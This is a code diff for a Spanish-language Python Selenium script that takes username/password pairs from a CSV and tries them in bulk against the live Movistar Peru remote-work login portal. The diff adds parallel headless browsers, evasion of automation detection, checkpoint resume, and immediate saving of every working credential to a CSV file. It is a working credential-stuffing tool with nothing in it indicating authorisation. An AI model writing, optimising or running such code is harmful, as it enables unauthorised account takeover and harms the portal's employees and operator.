@@ -11,11 +11,13 @@ from colorama import Fore, Style, init
 import os
 import logging
 from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import threading
 
 # Configurar logging
 logging.basicConfig(
     level=logging.INFO,
-    format='%(asctime)s - %(levelname)s - %(message)s',
+    format='%(asctime)s - %(threadName)s - %(levelname)s - %(message)s',
     handlers=[
         logging.FileHandler('login_results.log'),
         logging.StreamHandler()
@@ -28,6 +30,10 @@ init(autoreset=True)
 
 # URL del login
 URL = "https://teletrabajo.movistar.pe"
+
+# Lock para escritura segura
+file_lock = threading.Lock()
+progress_lock = threading.Lock()
 
 def cargar_credenciales_csv():
     """Cargar credenciales desde el archivo CSV"""
@@ -123,19 +129,39 @@ def cargar_credenciales_csv():
         return None
 
 def configurar_driver():
-    """Configurar el navegador Chrome con opciones optimizadas"""
+    """Configurar el navegador Chrome con opciones optimizadas para velocidad"""
     options = webdriver.ChromeOptions()
+    
+    # Modo headless (sin ventana visible) - MÁS RÁPIDO
+    options.add_argument("--headless=new")
+    options.add_argument("--disable-gpu")
+    
+    # Optimizaciones de rendimiento
     options.add_argument("--start-maximized")
     options.add_argument("--disable-blink-features=AutomationControlled")
     options.add_argument("--disable-extensions")
     options.add_argument("--no-sandbox")
     options.add_argument("--disable-dev-shm-usage")
-    options.add_experimental_option("excludeSwitches", ["enable-automation"])
-    options.add_experimental_option('useAutomationExtension', False)
-    options.add_experimental_option("excludeSwitches", ["enable-logging"])
     
-    # Opcional: modo headless (descomenta si quieres que corra sin ventana visible)
-    # options.add_argument("--headless")
+    # Deshabilitar imágenes y CSS para cargar más rápido
+    prefs = {
+        "profile.managed_default_content_settings.images": 2,  # No cargar imágenes
+        "profile.managed_default_content_settings.stylesheets": 2,  # No cargar CSS
+        "profile.default_content_setting_values.notifications": 2,  # Deshabilitar notificaciones
+        "disk-cache-size": 4096  # Cache pequeño
+    }
+    options.add_experimental_option("prefs", prefs)
+    
+    # Más optimizaciones
+    options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
+    options.add_experimental_option('useAutomationExtension', False)
+    options.add_argument("--disable-logging")
+    options.add_argument("--log-level=3")
+    options.add_argument("--silent")
+    
+    # Deshabilitar carga de recursos innecesarios
+    options.add_argument("--blink-settings=imagesEnabled=false")
+    options.add_argument("--disable-remote-fonts")
     
     try:
         driver = webdriver.Chrome(
@@ -143,11 +169,10 @@ def configurar_driver():
             options=options
         )
         driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
-        logger.info("✅ Navegador configurado exitosamente")
+        logger.info("✅ Navegador configurado exitosamente (modo optimizado)")
         return driver
     except Exception as e:
-        print(f"❌ Error al configurar el navegador: {e}")
-        logger.error(f"Error configurando navegador: {e}")
+        logger.error(f"Error al configurar el navegador: {e}")
         return None
 
 def intentar_login(driver, wait, usuario, password):
@@ -234,7 +259,6 @@ def verificar_resultado_login(driver, wait):
             return False
         
         # Verificar si hay elementos que indiquen login exitoso
-        # (ajusta estos selectores según la página real después del login)
         indicadores_exito = [
             "//div[contains(@class, 'dashboard')]",
             "//div[contains(@class, 'home')]",
@@ -264,29 +288,96 @@ def verificar_resultado_login(driver, wait):
         logger.error(f"Error verificando resultado: {e}")
         return False
 
-def guardar_credenciales_exitosas(usuarios_exitosos):
-    """Guardar las credenciales exitosas en un archivo CSV"""
+def guardar_credencial_exitosa(usuario, password):
+    """Guardar credencial exitosa inmediatamente (thread-safe)"""
     try:
-        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        nombre_archivo = f"credenciales_exitosas_{timestamp}.csv"
-        
-        df = pd.DataFrame(usuarios_exitosos, columns=['usuario', 'password', 'fecha_hora'])
-        df.to_csv(nombre_archivo, index=False, encoding='utf-8')
-        
-        print(f"\n💾 Credenciales exitosas guardadas en: {nombre_archivo}")
-        logger.info(f"Archivo guardado: {nombre_archivo}")
-        
-        return nombre_archivo
+        with file_lock:
+            fecha_hora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            archivo = "credenciales_exitosas.csv"
+            
+            # Verificar si el archivo existe
+            existe = os.path.exists(archivo)
+            
+            # Crear DataFrame con la nueva credencial
+            df_nueva = pd.DataFrame([{
+                'usuario': usuario,
+                'password': password,
+                'fecha_hora': fecha_hora
+            }])
+            
+            # Guardar (append si existe, crear si no)
+            if existe:
+                df_nueva.to_csv(archivo, mode='a', header=False, index=False, encoding='utf-8')
+            else:
+                df_nueva.to_csv(archivo, mode='w', header=True, index=False, encoding='utf-8')
+            
+            logger.info(f"💾 Credencial guardada: {usuario}")
+            
     except Exception as e:
-        print(f"❌ Error al guardar credenciales: {e}")
-        logger.error(f"Error guardando credenciales: {e}")
-        return None
+        logger.error(f"Error guardando credencial {usuario}: {e}")
+
+def guardar_checkpoint(indice, total):
+    """Guardar progreso actual"""
+    try:
+        with open("checkpoint.txt", "w") as f:
+            f.write(f"{indice},{total}")
+    except:
+        pass
+
+def cargar_checkpoint():
+    """Cargar progreso guardado"""
+    try:
+        if os.path.exists("checkpoint.txt"):
+            with open("checkpoint.txt", "r") as f:
+                contenido = f.read().strip()
+                if contenido:
+                    indice, total = map(int, contenido.split(','))
+                    return indice
+    except:
+        pass
+    return 0
+
+def procesar_credencial_thread(args):
+    """Función para procesar una credencial en un thread"""
+    idx, usuario, password, checkpoint_cada = args
+    
+    driver = None
+    try:
+        # Crear driver para este thread
+        driver = configurar_driver()
+        if driver is None:
+            return (idx, usuario, False)
+        
+        wait = WebDriverWait(driver, 15)
+        
+        # Intentar login
+        resultado = intentar_login(driver, wait, usuario, password)
+        
+        if resultado:
+            # Guardar inmediatamente si es exitoso
+            guardar_credencial_exitosa(usuario, password)
+        
+        # Guardar checkpoint cada N usuarios
+        if idx % checkpoint_cada == 0:
+            guardar_checkpoint(idx, checkpoint_cada)
+        
+        return (idx, usuario, resultado)
+        
+    except Exception as e:
+        logger.error(f"Error procesando {usuario}: {e}")
+        return (idx, usuario, False)
+    finally:
+        if driver:
+            try:
+                driver.quit()
+            except:
+                pass
 
 def main():
     """Función principal del programa"""
     print(Fore.CYAN + "="*70)
     print(Fore.CYAN + "🚀 VALIDADOR DE CREDENCIALES - TELETRABAJO MOVISTAR PERÚ")
-    print(Fore.CYAN + "📋 Procesando credenciales desde credenciales.csv")
+    print(Fore.CYAN + "⚡ MODO OPTIMIZADO: Multi-threading + Headless + Sin CSS/imágenes")
     print(Fore.CYAN + "="*70)
     
     # Cargar credenciales
@@ -294,72 +385,89 @@ def main():
     if credenciales is None or len(credenciales) == 0:
         return
     
+    # Configuración de threads
+    NUM_THREADS = int(input("\n🔧 ¿Cuántos navegadores quieres usar en paralelo? (recomendado 3-5): ") or "3")
+    CHECKPOINT_CADA = 100
+    
     print(f"\n📊 Total de credenciales a probar: {len(credenciales)}")
-    print("\n🔧 Configurando navegador...")
+    print(f"🔀 Usando {NUM_THREADS} navegadores en paralelo")
+    print(f"💾 Guardando checkpoint cada {CHECKPOINT_CADA} usuarios")
     
-    # Configurar driver
-    driver = configurar_driver()
-    if driver is None:
-        return
+    # Verificar si hay checkpoint previo
+    inicio = cargar_checkpoint()
+    if inicio > 0:
+        respuesta = input(f"\n⚠️ Se encontró progreso previo en índice {inicio}. ¿Continuar desde ahí? (s/n): ")
+        if respuesta.lower() != 's':
+            inicio = 0
     
-    wait = WebDriverWait(driver, 15)
+    if inicio > 0:
+        credenciales = credenciales.iloc[inicio:]
+        print(f"▶️ Continuando desde índice {inicio}")
+    
     usuarios_exitosos = []
+    usuarios_fallidos = []
     
     try:
-        # Procesar cada credencial
-        for idx, row in tqdm(
-            credenciales.iterrows(),
-            total=len(credenciales),
-            desc="🔄 Probando credenciales"
-        ):
-            usuario = row["usuario"]
-            password = row["password"]
-            
-            print(f"\n" + "="*70)
-            print(f"👤 PROBANDO: {usuario}")
-            print("="*70)
-            
-            # Intentar login
-            resultado = intentar_login(driver, wait, usuario, password)
-            
-            if resultado:
-                fecha_hora = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                usuarios_exitosos.append((usuario, password, fecha_hora))
-                print(Fore.GREEN + f"✅ LOGIN EXITOSO: {usuario}")
-            else:
-                print(Fore.RED + f"❌ LOGIN FALLIDO: {usuario}")
-            
-            # Pequeña pausa entre intentos
-            time.sleep(2)
+        # Preparar argumentos para los threads
+        tareas = [
+            (idx + inicio, row['usuario'], row['password'], CHECKPOINT_CADA)
+            for idx, (_, row) in enumerate(credenciales.iterrows())
+        ]
         
-        # Mostrar resumen
+        print(f"\n🏁 Iniciando procesamiento paralelo...")
+        print(f"⏱️ Tiempo estimado: ~{(len(tareas) * 8) / NUM_THREADS / 3600:.1f} horas\n")
+        
+        # Procesar con ThreadPoolExecutor
+        with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
+            # Enviar todas las tareas
+            futures = {executor.submit(procesar_credencial_thread, tarea): tarea for tarea in tareas}
+            
+            # Procesar resultados con barra de progreso
+            with tqdm(total=len(tareas), desc="🔄 Procesando", unit="usuarios") as pbar:
+                for future in as_completed(futures):
+                    try:
+                        idx, usuario, resultado = future.result()
+                        
+                        if resultado:
+                            usuarios_exitosos.append(usuario)
+                            tqdm.write(Fore.GREEN + f"✅ [{idx}] LOGIN EXITOSO: {usuario}")
+                        else:
+                            usuarios_fallidos.append(usuario)
+                            
+                        pbar.update(1)
+                        
+                    except Exception as e:
+                        logger.error(f"Error obteniendo resultado: {e}")
+                        pbar.update(1)
+        
+        # Mostrar resumen final
         print("\n" + "="*70)
-        print("📊 RESUMEN DE RESULTADOS")
+        print("📊 RESUMEN FINAL DE RESULTADOS")
         print("="*70)
-        print(f"Total probadas: {len(credenciales)}")
-        print(f"Exitosas: {len(usuarios_exitosos)}")
-        print(f"Fallidas: {len(credenciales) - len(usuarios_exitosos)}")
+        print(f"Total procesadas: {len(credenciales)}")
+        print(f"✅ Exitosas: {len(usuarios_exitosos)}")
+        print(f"❌ Fallidas: {len(usuarios_fallidos)}")
+        print(f"📈 Tasa de éxito: {(len(usuarios_exitosos)/len(credenciales)*100):.2f}%")
         
-        # Guardar credenciales exitosas
         if usuarios_exitosos:
-            print(f"\n✅ Credenciales exitosas encontradas:")
-            for usuario, password, fecha in usuarios_exitosos:
-                print(f"   - {usuario} | {password} | {fecha}")
-            
-            guardar_credenciales_exitosas(usuarios_exitosos)
+            print(f"\n💾 Credenciales exitosas guardadas en: credenciales_exitosas.csv")
+            print(f"📝 Total de credenciales válidas: {len(usuarios_exitosos)}")
         else:
             print("\n❌ No se encontraron credenciales válidas")
+        
+        # Limpiar checkpoint
+        if os.path.exists("checkpoint.txt"):
+            os.remove("checkpoint.txt")
             
     except KeyboardInterrupt:
         print(Fore.YELLOW + "\n⚠️ Programa interrumpido por el usuario")
+        print(f"💾 Progreso guardado. Puedes reanudar ejecutando el script nuevamente")
         logger.warning("Programa interrumpido por el usuario")
     except Exception as e:
         print(Fore.RED + f"\n❌ Error general: {e}")
         logger.error(f"Error general: {e}")
     finally:
-        print("\n🔒 Cerrando navegador...")
-        driver.quit()
-        print("✅ Programa finalizado")
+        print("\n✅ Programa finalizado")
         logger.info("Programa finalizado")
 
 if __name__ == "__main__":
